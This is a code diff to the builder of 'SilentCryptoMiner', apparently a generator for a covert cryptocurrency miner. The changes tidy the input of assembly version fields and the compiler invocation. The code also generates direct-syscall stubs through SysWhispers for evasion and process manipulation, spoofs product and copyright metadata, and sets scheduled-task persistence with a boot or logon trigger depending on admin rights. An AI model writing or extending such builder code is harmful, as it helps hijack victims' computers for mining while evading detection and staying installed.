@@ -51,7 +51,12 @@ namespace SilentCryptoMiner
                     resource.Replace("#PRODUCT", F.ToLiteral(F.txtAssemblyProduct.Text));
                     resource.Replace("#COPYRIGHT", F.ToLiteral(F.txtAssemblyCopyright.Text));
                     resource.Replace("#TRADEMARK", F.ToLiteral(F.txtAssemblyTrademark.Text));
-                    resource.Replace("#VERSION", string.Join(",", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }));
+                    resource.Replace("#VERSION", string.Join(",", new string[] { 
+                        SanitizeNumber(F.txtAssemblyVersion1.Text).ToString(), 
+                        SanitizeNumber(F.txtAssemblyVersion2.Text).ToString(), 
+                        SanitizeNumber(F.txtAssemblyVersion3.Text).ToString(), 
+                        SanitizeNumber(F.txtAssemblyVersion4.Text).ToString()
+                    }));
                     defs += " -DDefAssembly";
                 }
 
@@ -69,7 +74,7 @@ namespace SilentCryptoMiner
 
                 RunExternalProgram($"\"{paths["syswhispersu"]}\" -a x64 -l gas --function-prefix \"Ut\" -f NtSetInformationFile,NtSetInformationProcess,NtCreateFile,NtWriteFile,NtReadFile,NtDeleteFile,NtCreateSection,NtClose,NtMapViewOfSection,NtOpenFile,NtResumeThread,NtGetContextThread,NtSetContextThread,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtFreeVirtualMemory,NtDelayExecution,NtOpenProcess,NtCreateUserProcess,NtOpenProcessToken,NtWaitForSingleObject,NtQueryAttributesFile,NtQueryInformationFile,NtCreateMutant,NtAdjustPrivilegesToken,NtQuerySystemInformation,NtQueryInformationToken,NtOpenKey,NtEnumerateKey,NtQueryValueKey,NtRenameKey -o \"{currentDirectory}\\UFiles\\Syscalls\\syscalls\"", currentDirectory, paths["syswhispersulog"]);
                 File.WriteAllText(paths["filename"] + ".cpp", maincode.ToString());
-                RunExternalProgram(compilerCommand, paths["compilerbin"], paths["g++log"]);
+                RunExternalProgram($"\"{paths["g++"]}\" " + compilerCommand, paths["compilerbin"], paths["g++log"]);
                 File.Delete(paths["resource.o"]);
                 File.Delete(paths["filename"] + ".cpp");
                 if (F.BuildError(!File.Exists(paths["filename"] + ".exe"), string.Format("Error: Failed at compiling program, check the error log at {0}.", paths["g++log"])))
@@ -245,6 +250,12 @@ namespace SilentCryptoMiner
             return result;
         }
 
+        public static int SanitizeNumber(string input)
+        {
+            string sanitized = new string(input.Where(char.IsDigit).ToArray());
+            return string.IsNullOrEmpty(sanitized) ? 0 : int.Parse(sanitized);
+        }
+
         public static string ReplaceEscape(string input)
         {
             StringBuilder output = new StringBuilder(input);
@@ -348,7 +359,7 @@ namespace SilentCryptoMiner
                 stringb.Replace("#STARTUPFILE", @"\\" + F.txtStartupFileName.Text.Replace(@"\", @"\\"));
                 stringb.Replace("#TMPXML", $@"\\{F.Randomi(12, false)}.xml");
 
-                CreateResource(globalResources, "resTaskTemplate", Encoding.UTF8.GetBytes(Properties.Resources.TaskTemplate.Replace("#STARTUPPATH", $"%{F.Invoke(new Func<string>(() => F.txtStartupPath.Text))}%\\{F.Invoke(new Func<string>(() => F.txtStartupFileName.Text))}")));
+                CreateResource(globalResources, "resTaskTemplate", Encoding.UTF8.GetBytes(Properties.Resources.TaskTemplate.Replace("#STARTUPPATH", $"%{F.Invoke(new Func<string>(() => F.txtStartupPath.Text))}%\\{F.Invoke(new Func<string>(() => F.txtStartupFileName.Text))}").Replace("#STARTUPTRIGGER", systemadmincheck ? "BootTrigger" : "LogonTrigger")));
 
                 if (F.toggleWatchdog.Checked)
                 {
